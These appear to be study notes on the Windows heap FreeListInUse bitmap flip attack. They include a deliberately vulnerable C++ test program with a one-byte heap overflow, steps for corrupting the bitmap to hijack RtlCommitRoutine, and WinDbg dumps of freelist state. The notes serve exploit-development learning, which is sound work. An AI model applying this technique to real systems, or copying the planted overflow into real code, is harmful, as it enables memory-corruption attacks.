                003605D8  E8 05 36 00 00 00 00 00  è6.....
                003605E0  00 00 00 00 00 00 00 00  ........
                003605E8  F8 05 36 00 00 00 00 00  ø6.....
                003605F0  00 00 00 00 00 00 00 00  ........
                003605F8  00 00 00 00 00 00 00 00  ........
                00360600  00 00 00 00 00 00 00 00  ........
                00360608  E0 E9 97 7C FF FF FF FF  àé—|ÿÿÿÿ
                00360610  00 00 00 00 00 00 00 00  ........
                00360618  00 00 00 00 00 00 00 00  ........
                00360620  00 00 00 00 00 00 00 00  ........
                00360628  00 00 00 00 00 00 00 00  ........
                00360630  00 00 00 00 00 00 00 00  ........
                00360638  00 00 00 00 00 00 00 00  ........
                00360640  08 00 C8 00 00 01 00 00  .È....
                00360648  EE FF EE FF 00 00 00 00  îÿîÿ....
                00360650  00 00 36 00 00 B0 03 00  ..6..°.
                00360658  00 00 36 00 40 00 00 00  ..6.@...
                00360660  80 06 36 00 00 00 3A 00  €6...:.
                00360668  3B 00 00 00 01 00 00 00  ;......
                00360670  88 05 36 00 00 00 00 00  ˆ6.....
                00360678  A0 36 36 00 00 00 00 00   66.....
                00360680  01 03 08 00 14 01 08 00  ..
                00360688  00 00 00 00 00 00 00 00  ........
                00360690  04 00 00 01 00 00 00 00  ......
                00360698  00 00 00 00 00 00 00 00  ........
                003606A0  00 00 00 00 00 00 00 00  ........
                003606A8  00 00 00 00 01 00 00 00  .......
                003606B0  00 00 00 00 00 00 00 00  ........
                003606B8  00 00 00 00 00 00 00 00  ........
                003606C0  04 00 00 01 00 00 00 00  ......
                003606C8  00 00 00 00 00 00 00 00  ........
                003606D0  00 00 00 00 00 00 00 00  ........
                003606D8  00 00 00 00 01 00 00 00  .......
                003606E0  01 00 00 00 00 00 00 00  .......
                003606E8  00 00 00 00 00 00 00 00  ........
                003606F0  04 00 00 01 00 00 00 00  ......
                003606F8  00 00 00 00 00 00 00 00  ........
                00360700  00 00 00 00 00 00 00 00  ........
                00360708  00 00 00 00 00 00 00 00  ........
                00360710  00 00 00 00 00 00 00 00  ........
                00360718  00 00 00 00 00 00 00 00  ........
                00360720  04 00 00 01 00 00 00 00  ......
                00360728  00 00 00 00 00 00 00 00  ........
                00360730  00 00 00 00 00 00 00 00  ........
                00360738  00 00 00 00 00 00 00 00  ........
                00360740  00 00 00 00 00 00 00 00  ........
                00360748  00 00 00 00 00 00 00 00  ........
                00360750  04 00 00 01 00 00 00 00  ......
                00360758  00 00 00 00 00 00 00 00  ........
                00360760  00 00 00 00 00 00 00 00  ........
                00360768  00 00 00 00 01 00 00 00  .......
                00360770  00 00 00 00 00 00 00 00  ........
                00360778  00 00 00 00 00 00 00 00  ........
                00360780  04 00 00 01 00 00 00 00  ......
                00360788  00 00 00 00 00 00 00 00  ........
                00360790  00 00 00 00 00 00 00 00  ........
                00360798  00 00 00 00 00 00 00 00  ........
                003607A0  00 00 00 00 00 00 00 00  ........
                003607A8  00 00 00 00 00 00 00 00  ........
                003607B0  04 00 00 01 00 00 00 00  ......
                003607B8  00 00 00 00 00 00 00 00  ........
                003607C0  00 00 00 00 00 00 00 00  ........
                003607C8  00 00 00 00 00 00 00 00  ........
                003607D0  00 00 00 00 00 00 00 00  ........
                003607D8  00 00 00 00 00 00 00 00  ........
                003607E0  04 00 00 01 00 00 00 00  ......
                003607E8  00 00 00 00 00 00 00 00  ........
                003607F0  00 00 00 00 00 00 00 00  ........
                003607F8  00 00 00 00 00 00 00 00  ........
                00360800  00 00 00 00 00 00 00 00  ........
                00360808  00 00 00 00 00 00 00 00  ........
                00360810  04 00 00 01 00 00 00 00  ......
                00360818  00 00 00 00 00 00 00 00  ........
                00360820  00 00 00 00 00 00 00 00  ........
                00360828  00 00 00 00 00 00 00 00  ........
                00360830  00 00 00 00 00 00 00 00  ........
                00360838  00 00 00 00 00 00 00 00  ........
                00360840  04 00 00 01 00 00 00 00  ......
                ```

    - FreeListInUse Bitmap Flip Attack

        - FreeListInUse Bitmap is found at +0x158 offset

        - Optimization functionality: during a Heap Allocation, the manager will walk through the Bitmap from the exact index the allocation could be possibly fufilled and start the scan for free chunks there.

        - Range of freelist is from 0 - 127, total 128 entries (0x80). Each entry is 0x8 bytes long. Total size is 0x400. Hence range is from +178 to +578, with last entry being at +570

        - Freelist mechanic: If i want to allocate 32 bytes, I would store it in 32+8/8 = 5 hence index 4 of freelist.

        - Assume there is no free chunk at freelist[0x66] which is at +0x4a8 but we corrupt the bitmap to make it look like there is a freechunk, we can return a pointer to +0x4a8 and then corrupt the RtlCommitRoutine at +0x57c. However, we also need to stop the traversal from the actually empty freelist[0x66]

        - The heap manager will use this instruction to stop the traversal of the bitmap: test cl, 0x10. We need to make sure we fail the check and return false

            ```
            003604A0 A0 04 36 00 A0 ||04|| 36 00  <- value of flag that will be checked
            003604A8 A8 04 36 00 A8 04 36 00 
            ```

        - Range of values that will fail check

            ```
            0x10-0x1f
            0x30-0x3f
            0x50-0x5f
            0x70-0x7f
            0x90-0x9f
            0xb0-0xbf
            0xd0-0xdf
            0xf0-0xff
            ```

        - How to flip bitmap (from FuzzySecurity):

            - Trigger a heap overflow and modify the size only of a FreeList[n] chunk (must be the only chunk in that FreeList[n] entry). You modify it with a size that you want to flip at. So when the free overflow chunk is allocated, it will switch the FreeList entry corresponding to the modified size.

            - Trigger a heap overflow and modify the size, flink/blink and set the chunk flag to 0x10 of a FreeList[n] chunk (doesnt matter if the FreeList[n] entry has multiple chunks). You made  the flink and blink the same value and set the flag, so the algorithm will think they are the last chunk on a freelist entry. When you allocate that chunk, the FreeListInUse entry corresponding to the modified size will be change into 1.
            
            - You gain control of a primitive via a 'inc( ptr )'. You  modify the FreeListInUse for an empty entry. Allocate a chunk of the size of the entry - 8.

        - Vulnerable Program:

            ```
            // HeapOverflowsBitmapFlipAttack.cpp : Defines the entry point for the console application.
            //

            #include "stdafx.h"
            #include <stdio.h>
            #include <windows.h>
            int main(int argc,char *argv[])
            {
                HLOCAL a,b,c,d,e,f,g,h,i,j,k,l,m,trigger,x,y,w,u,z,q,o;
                HANDLE hHeap;
            
                hHeap = HeapCreate(0x00040000,0,0);

                int first = 0x3*8-0x8;
                int sec = 0x70; // set to +1

                int second = sec*8-0x8;
                int ret = (sec+1)*8-0x8;
            
                a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                d = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
            
                e = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                f = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first); // forces onto freelist[0x3] because two busy chunks exist
                g = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first); // around the chunk
            
                // allocate for freelist[0x7b]
                z = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
                x = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
                y = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
                w = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
            
                q = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second);
                u = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second); // forces onto freelist[0x7b] because two busy chunks exist
                o = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,second); // around the chunk
            
                // fill lookaside[0x3]
                HeapFree(hHeap, 0, a);
                HeapFree(hHeap, 0, b);
                HeapFree(hHeap, 0, c);
                HeapFree(hHeap, 0, d);
            
                // insert into freelist[0x3]
                HeapFree(hHeap, 0, f);
            
                printf("(+) Chunk e: 0x%08x\n",e);
                printf("(+) Fill chunk e (using 16 bytes), overflowing into chunk f (0x%08x) by 1 byte:\n",e);
                printf("(+) Overflow with size 0x7c (AAAAAAAAAAAAAAAA|)...\n");

                char buf[32];
                fgets(buf,32,stdin);

                __asm { int 0x3 };

                memcpy(e, buf, strlen(buf));
            
                // remove the chunks on the lookaside
                h = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                i = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                j = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
                k = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
            
                // this is where we flip the bitmap. FreelistInUse [0x7c] = 1
                l = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,first);
            
                // fill lookaside[0x7b]
                HeapFree(hHeap, 0, z);
                HeapFree(hHeap, 0, x);
                HeapFree(hHeap, 0, y);
                HeapFree(hHeap, 0, w);
            
                // insert into freelist[0x7b]
                HeapFree(hHeap, 0, u);
            
                // return the chunk that points to itself in freelist[0x7c], so we can overwrite management structures...
                m = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,ret);
            
                printf("(+) Fill chunk m and destroy the management structure:\n");
                char buf2[0x1000];
                fgets(buf2,0x1000,stdin);
                memcpy(m, buf2, 0x1000);
            
                // force the heap to be extended triggering RtlCommitRoutine
                trigger = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,4096);
            
                exit(0);
            }
            ```

        - Debugging/Analysis:

            - Some things about the heap: when ever we call HeapAlloc, no matter what the size request is, the manager seems to just occupy and take from index 0

            - After freeing 4 allocations to the lookaside list, the fifth allocation will go to the freelist

                ```
                0:001> dd 150688 L80
                ...
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00000000 00010000 01000004 0000000c
                00150728  0000000b 00000001 00000000 00000000
                00150738  00000000 00000000 00000000 00000000
                ...
                ```

                - 0 Free

                ```
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153550 00020001 01000004 0000000c
                00150728  0000000b 00000002 00000000 00000000
                00150738  00000000 00000000 00000000 00000000
                ```

                - 1 Free

                ```
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153568 00030002 01000004 0000000c
                00150728  0000000b 00000003 00000000 00000000
                00150738  00000000 00000000 00000000 00000000
                ```

                - 2 Free

                ```
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153580 00040003 01000004 0000000c
                00150728  0000000b 00000004 00000000 00000000
                00150738  00000000 00000000 00000000 00000000
                ```

                - 3 Free

                ```
                0:001> dd 150178
                00150178  00153640 00153640 00150180 00150180
                00150188  00150188 00150188 00150190 00150190
                00150198  00150198 00150198 001501a0 001501a0
                001501a8  001501a8 001501a8 001501b0 001501b0
                001501b8  001501b8 001501b8 001501c0 001501c0
                001501c8  001501c8 001501c8 001501d0 001501d0
                001501d8  001501d8 001501d8 001501e0 001501e0
                001501e8  001501e8 001501e8 001501f0 001501f0
                ...
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153598 00050004 01000004 0000000c
                00150728  0000000b 00000005 00000000 00000000
                00150738  00000000 00000000 00000000 00000000
                ```

                - 4 Free

                ```
                0:001> dd 150178
                00150178  00153640 00153640 00150180 00150180
                00150188  00150188 00150188 001535b0 001535b0
                00150198  00150198 00150198 001501a0 001501a0
                001501a8  001501a8 001501a8 001501b0 001501b0
                001501b8  001501b8 001501b8 001501c0 001501c0
                001501c8  001501c8 001501c8 001501d0 001501d0
                001501d8  001501d8 001501d8 001501e0 001501e0
                001501e8  001501e8 001501e8 001501f0 001501f0
                ...
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153598 00050004 01000004 0000000c
                00150728  0000000b 00000006 00000001 00000000
                00150738  00000000 00000000 00000000 00000000
                ```

            - For freelist[0x3], we will be storing 16 bytes, cause 16+8/8=3 / 0x3*0x8=0x18,0x18-8=0x10=16

            - If you free another 16 bytes, which is actually 24 bytes, freelist[0x3] will be empty and freelist[0x6] will have a chunk which is basically the sum of the previous 16 bytes freed chunk and the now freed 16 bytes freed chunk.

                ```
                0:001> dd 150178
                00150178  00153640 00153640 00150180 00150180
                00150188  00150188 00150188 001535b0 001535b0
                00150198  00150198 00150198 001501a0 001501a0
                001501a8  001501a8 001501a8 001501b0 001501b0
                001501b8  001501b8 001501b8 001501c0 001501c0
                001501c8  001501c8 001501c8 001501d0 001501d0
                001501d8  001501d8 001501d8 001501e0 001501e0
                001501e8  001501e8 001501e8 001501f0 001501f0
                0:001> g
                (3c8.44c): Break instruction exception - code 80000003 (first chance)
                eax=7ffdf000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
                eip=7c90120e esp=0036ffcc ebp=0036fff4 iopl=0         nv up ei pl zr na pe nc
                cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
                ntdll!DbgBreakPoint:
                7c90120e cc              int     3
                0:001> dd 150178
                00150178  00153640 00153640 00150180 00150180
                00150188  00150188 00150188 00150190 00150190
                00150198  00150198 00150198 001501a0 001501a0
                001501a8  001535b0 001535b0 001501b0 001501b0
                001501b8  001501b8 001501b8 001501c0 001501c0
                001501c8  001501c8 001501c8 001501d0 001501d0
                001501d8  001501d8 001501d8 001501e0 001501e0
                001501e8  001501e8 001501e8 001501f0 001501f0

                freelist[0x6] (for 24+16+8bytes, cause 40+8/8=6) 001501a8
                ```
            - If we allocate 12 bytes and free it, it will go to index 0x3

                ```
                001506e8  00000000 00000000 01000004 00000000
                001506f8  00000000 00000000 00000000 00000000
                00150708  00000000 00000000 00000000 00000000
                00150718  00153550 00020001 01000004 0000000c
                ```

            - Strangely, allocating and freeing 0 bytes will go to index 0x2, hence we can deduce the range

                ```
                9-16: 0x3
                 0-8: 0x2
                ????: 0x1
                ```

            - Situation of bitmap:

                ```
                0:001> dd 360158
                00360158  00000008 00000000 00000000 00000000
                00360168  00000000 00000001 00000000 00000000
                00360178  00363a20 00363a20 00360180 00360180
                00360188  00360188 00360188 00361f08 00361f08
                00360198  00360198 00360198 003601a0 003601a0
                003601a8  003601a8 003601a8 003601b0 003601b0
                003601b8  003601b8 003601b8 003601c0 003601c0
                003601c8  003601c8 003601c8 003601d0 003601d0
                ```

                - Bitmap will take up only 4 DWORDS, 1 DWORD = 32 bits, 32 * 4 = 128

                - This bitmap is after we have freed the fifth allocation of 16 bytes

                - 0x00000008: 0000 0000 0000 0000 0000 0000 0000 1000

                    ```
                    0      0      0      0     1     0     0      0
                    7      6      5      4     3     2     1      0
                    ```

            - Attack: fill chunk with 16 bytes and overflow the freed chunk in the freelist by 1 byte (to set the size of the freed chunk in the freelist so that we corrupt the bitmap and manipulate the returning of a pointer in the freelist)

            - Bitmap after corruption

                ```
                00360158  08 00 00 00 00 00 00 00  .......
                00360160  00 00 00 00 00 00 00 10  .......
                00360168  00 00 00 00 01 00 00 00  .......
                00360170  00 00 00 00 00 00 00 00  ........
                ```

                ```
                0x7c is 124

                16 * 8 = 128

                0 0 0 0 1 0 0 0
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 0 0 0 0 0 
                0 0 0 1 0 0 0 0

                0      0      0      1     0     0     0      0
                127    126    125    124   123   122   121    120
                ```
            
            - Similar to searching attack, repair the heap manually during the overflow
